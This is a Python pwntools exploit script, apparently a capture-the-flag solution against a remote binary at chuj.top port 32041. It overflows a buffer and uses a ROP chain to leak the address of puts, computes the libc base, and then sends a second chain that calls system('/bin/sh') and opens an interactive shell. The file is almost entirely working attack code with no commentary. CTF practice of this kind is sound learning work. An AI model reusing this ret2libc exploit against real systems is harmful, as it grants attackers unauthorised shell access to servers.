#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

ip = 'chuj.top'
port = '32041'
reomote_addr = [ip,port]
binary = './a.out'

libc = ELF('./libc-2.31.so')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
	addr = u64(p.recvuntil('\x7e')[-6:].ljust(8,'\x00'))
	base = addr - offset
	print "[+]libc_base=>"+hex(base)
	return base

pop_rdi_ret = 0x0000000000401313
ret = 0x000000000040101a
main = 0x0000000004010D0

# payload = 'a'*0x30 + 'junkjunk' + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(main)
payload = 'a'*0x28
# attach(p,'b *0x0000000000401211')

sd(payload)

payload1 = 'b'*0x4 + p32(0x28+4) + 'b'*8 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)
sl(payload1)

rv(0x2a)
puts = u64(ru('\x7f').ljust(8,'\x00'))
print "puts=>"+hex(puts)

libc_base = puts - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()
shell = libc_base + 0xe6c84

# attach(p,'b *0x0000000000401211')
payload = 'a'*0x28+'b'*0x4 + p32(0x28+4) + 'b' *0x8 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(main)

pause()
sl(payload)
rv(0x2a)
pause()

it()